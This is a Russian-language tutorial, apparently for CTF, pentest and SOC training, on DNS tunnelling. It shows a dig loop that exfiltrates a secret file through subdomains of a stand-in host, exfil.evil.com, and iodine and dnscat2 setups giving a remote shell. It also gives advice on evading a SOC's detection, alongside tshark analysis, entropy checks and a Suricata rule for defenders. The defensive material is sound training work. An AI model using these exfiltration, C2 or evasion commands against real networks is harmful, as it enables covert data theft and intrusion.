## Вопрос, с которого всё начинается

Периметр разрешает наружу **только DNS**. Ни HTTP, ни SSH — всё остальное упирается в таймаут. А тебе нужно вынести файл с секретом и, в идеале, получить шелл на внутреннем хосте.

DNS почти всегда разрешён (иначе не работает интернет), поэтому это идеальный транспорт для скрытой передачи данных. Разберём, как построить туннель поверх DNS и как его потом детектировать.

## Наш пример: наружу ходит только DNS

Проверяем egress:

```
$ nc -vz attacker.example 443
nc: connect to attacker.example port 443 (tcp) failed: Connection timed out
$ dig +short @8.8.8.8 example.com
93.184.216.34
```

HTTPS не проходит, DNS отвечает. Значит, носителем будет DNS.

## Шаг 1: делегирование домена на свой сервер

Чтобы запросы доходили до тебя, нужен домен, у которого NS-записи указывают на твой сервер:

```
$ dig +short NS t.evil.com
ns1.attacker.com.
$ dig +short A ns1.attacker.com
203.0.113.9
```

Без делегирования запросы уйдут на публичный резолвер и до твоего сервера не дойдут. На сервере поднимается авторитативный DNS (bind/nsd) на UDP/53.

## Шаг 2: кодируем данные в поддоменах

Простейший канал — ручной: данные кодируют в метки поддоменов. Метка ограничена 63 байтами, полное имя — 253, поэтому данные режут на фрагменты и нумеруют:

```
$ base64 secret.txt | fold -w 40 | head -2
U2VjcmV0IGZsYWc6IENURntkbnNfdHVubmVsfQ==
$ i=0; while read c; do dig +short "$i-$c.exfil.evil.com" A >/dev/null; i=$((i+1)); done < chunks.txt
```

Номер фрагмента (`i-`) в начале метки позволяет собрать данные по порядку на авторитативном сервере. Данные могут идти и в ответах — в записях **TXT** или **NULL** (там больше места, чем в A).

## Шаг 3: iodine — полноценный IP-over-DNS

`iodine` создаёт **tun-интерфейс** и маршрутизирует весь IP через DNS. На сервере:

```
$ sudo iodined -f -c -P secret 10.0.0.1 t.evil.com
```

На клиенте внутри сети:

```
$ sudo iodine -f -P secret t.evil.com
$ ip addr show tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP> mtu 1024
    inet 10.0.0.2/24 scope global tun0
```

Теперь `10.0.0.1` — это сервер, и трафик идёт поверх DNS:

```
$ ssh user@10.0.0.1
```

Ключи: `-f` (foreground), `-c` (не проверять клиентские IP), `-P` (пароль), `-m` (MTU), `-T` (тип записи: A/NULL/TXT/SRV/MX/CNAME).

## Шаг 4: dnscat2 — C2 и шелл

Если нужен интерактив и файлы, `dnscat2` даёт сессии поверх DNS:

```
# сервер:
$ ruby dnscat2.rb t.evil.com --secret=secret
# клиент (Linux/Windows):
$ ./dnscat --secret=secret t.evil.com
# в консоли сервера:
> sessions
> session -i 1
> shell
> download secret.txt
```

## Шаг 5: извлечение из PCAP (детект)

Когда ты аналитик, туннель видно по именам запросов. Сначала соберём поддомены:

```
$ tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | head -3
0-U2VjcmV0IGZsYWc.exfil.evil.com
1-aW5nIGRhdGE.exfil.evil.com
```

Проверим длину меток — у туннеля они длинные и случайные:

```
$ tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | \
    awk -F. '{print length($1)}' | sort -n | uniq -c | tail
    412 41
    388 44
```

Признаки туннеля: длинные высокоэнтропийные метки, много уникальных поддоменов под одним родителем, всплеск TXT/NULL-запросов, устойчивый объём. Отличие от CDN/DGA — **всегда есть ответы** и стабильный поток к одному домену.

## Оптимизация пропускной способности

«Чистый» DNS-туннель медленный (десятки-сотни КБ/с), поэтому его ускоряют:

- **Несколько поддоменов в одном запросе** — данные в нескольких метках.
- **Параллельные резолверы** — клиент шлёт запросы через несколько DNS-серверов.
- **Типы записей с большим ответом** — TXT/NULL вмещают больше, чем A.
- **Короткие TTL** — чтобы запросы реально доходили до вашего NS.
- **base32 без padding** — эффективнее по длине метки, чем base64.
- **Сжатие перед кодированием** (gzip/zstd) — но растёт энтропия (заметность).

```
$ iodine -f -P secret t.example.com --version
$ iperf3 -c 10.0.0.1
```

Обратная сторона: чем быстрее и «плотнее» туннель, тем он заметнее по энтропии меток и объёму.

## Ложные срабатывания

Не всякий «странный DNS» — туннель:

- CDN и телеметрия с длинными поддоменами;
- AV/EDR-домены с хэшами;
- DGA-малварь (похоже, но без коррелированных ответов — NXDOMAIN);
- сервисы аналитики с base64-идентификаторами.

Отличие туннеля: **устойчивый** объём, ответы сервера, коррелированные с запросами, часто к **одному** домену.

## Beaconing и C2-паттерны

dnscat2 и малварь часто генерируют **периодические** запросы (check-in) — классический beaconing: ровные интервалы к одному домену, фиксированный размер метки, «тихие» периоды, всегда есть ответы (в отличие от DGA/NXDOMAIN).

```
$ tshark -r t.pcap -Y 'dns.qry.name contains "t.example.com"' -T fields -e frame.time_relative | \
    awk 'NR>1{print $1-prev} {prev=$1}' | sort -n | uniq -c | tail
```

## Различие туннеля и легитимного трафика

Ключ к детекту — **комбинация** признаков, а не один. CDN и телеметрия дают длинные поддомены, но без устойчивого объёма к **одному** домену и без коррелированных ответов. DGA даёт случайные имена, но без ответов (NXDOMAIN). Туннель же: один родитель + много уникальных поддоменов + стабильный объём + всегда есть ответы.

```
$ tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | sort -u | wc -l
```

Для защиты ограничивают исходящий DNS корпоративными резолверами, включают RPZ и Response Rate Limiting, ведут ML-аналитику запросов и sinkhole'ят подозрительные домены.

## Шаг 6: как прячут сам туннель

Простой туннель видно по энтропии, поэтому его маскируют:

- **Кодировка под обычное.** Вместо случайных меток данные кладут в TXT-ответы с осмысленными именами (`_dmarc`, `_acme-challenge`) — выглядит как легитимная инфраструктура.
- **Шифрование до кодирования.** Payload шифруют (AES/XOR), потом base32 — содержимое не читается даже при перехвате.
- **Decoy-трафик.** Между «боевыми» запросами клиент шлёт обычные запросы к популярным доменам, размывая паттерн.
- **Смена доменов.** Несколько делегированных зон и ротация, чтобы не собирать объём на одном родителе.

Вывод для аналитика: одного признака мало. Смотреть надо на **корреляцию** — устойчивый объём к одному родителю, всегда есть ответы, ровный ритм — даже если имена выглядят легитимно.

## Строим детект: правило и пороги

Практический детект DNS-туннеля — это пороги, а не одно правило. Базовая эвристика в Suricata:

```yaml
alert dns $HOME_NET any -> any 53 (msg:"DNS tunnel - long high-entropy label";
  dns.query; pcre:"/^[a-z0-9]{30,}\./i"; threshold: type both, track by_src, count 20, seconds 60;
  sid:1000020; rev:1;)
```

Правило срабатывает на 30+ символов в первой метке, но только при 20 повторах за минуту — так отсекаются одиночные CDN-запросы. Дополнительно считают **энтропию Шеннона** метки: у слова она <3 бит/символ, у base32-блоба — >4. Порог по энтропии плюс число уникальных поддоменов под одним родителем дают устойчивый детект.

```
$ tshark -r t.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | \
    awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head -1
   5123 t.example.com
```

Тысячи уникальных поддоменов под одним родителем за короткое время — практически подпись туннеля.

## Если не сработало

- **Запросы не доходят до твоего NS.** Проверь делегирование: `dig NS t.evil.com @1.1.1.1` должен вернуть твой сервер, а не таймаут.
- **Туннель поднимается, но рвётся.** Снизь MTU (`-m 512`) — фрагментация DNS-пакетов ломает канал за плохими фильтрами.
- **Резолвер режет длинные имена.** Некоторые шлюзы дропают метки >32 символов; используй base32 короткими блоками или TXT-ответы.
- **Высокая энтропия детектится.** Если целевой SOC ловит туннель, маскируй под легитимные имена и добавляй decoy-запросы.
- **NXDOMAIN на все запросы.** Значит, делегирование не настроено — поддомен не уходит на твой сервер.

## Что мы теперь знаем

- DNS почти всегда разрешён наружу — идеальный транспорт.
- Нужен авторитативный NS: поддомен делегируется на свой сервер.
- Данные кодируют в поддомены (base32/base64) и ответы (TXT/NULL).
- `iodine` даёт IP-over-DNS (tun), `dnscat2` — C2 и шелл.
- Детект: длинные энтропийные метки, всплеск TXT, устойчивый поток к одному домену.
- Туннель маскируют осмысленными именами, шифрованием payload и decoy-трафиком.
- Детект строится на порогах: длинные метки + высокая энтропия + много уникальных поддоменов.
- Проверка делегирования — `dig NS <поддомен>`; без него запросы не доходят до твоего NS.
- Beaconing (ровные интервалы к одному домену) — отдельный признак C2-туннеля.
- Ручной канал (dig) годится для мелкой эксфильтрации, iodine — для полноценного IP-over-DNS.

| Инструмент | Модель | Пропускная способность |
|---|---|---|
| iodine | IP-over-DNS (tun) | высокая |
| dnscat2 | C2/шелл | средняя |
| dns2tcp | TCP-over-DNS | средняя |
| ручной dig | эксфильтрация | низкая |

## Куда дальше

Мы спрятали данные в DNS. Дальше — ещё тоньше: как передавать информацию в самих **таймингах** и полях пакетов, вообще не меняя содержимое. А пока запомни: **любой разрешённый наружу протокол с полем данных можно превратить в транспорт.**

## Где пригодится

- **CTF:** извлечение данных из DNS-трафика.
- **Пентест:** эксфильтрация при строгом egress.
- **SOC:** детект DNS-туннелей и DGA.
- **Red team:** C2 через разрешённый протокол.
- **Сетевая защита:** политика исходящего DNS.
